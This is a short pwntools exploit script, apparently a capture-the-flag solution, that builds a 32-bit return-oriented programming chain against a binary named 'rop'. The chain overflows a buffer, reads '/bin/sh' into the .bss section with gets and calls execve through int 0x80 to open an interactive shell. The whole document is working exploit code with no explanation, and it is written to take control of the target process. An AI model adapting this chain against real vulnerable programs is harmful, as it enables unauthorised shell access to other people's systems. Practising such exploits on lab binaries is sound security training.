from pwn import *
p = process('./rop') 
#p = remote('node3.buuoj.cn',26508)
e = ELF('./rop')
offset = 0xc
pop_ecx_ret = 0x80de769
pop_ebx_pop_edx_ret = 0x806ecd9
pop_esi_pop_ebx_pop_edx_ret = 0x806ecd8
pop_eax_ret = 0x80b8016
syscall = 0x80627cd
int_0x80 = 0x806c943
payload = b'A' * offset + p32(0xdeadbeef) 
payload += p32(e.sym['gets']) 
payload += p32(pop_eax_ret) 
payload += p32(e.bss()) 
payload += p32(pop_eax_ret) 
payload += p32(11) 
payload += p32(pop_ebx_pop_edx_ret) 
payload += p32(e.bss()) 
payload += p32(0) 
payload += p32(pop_ecx_ret) 
payload += p32(0) 
payload += p32(int_0x80)
p.sendline(payload)
p.sendline(b"/bin/sh\x00")
p.interactive()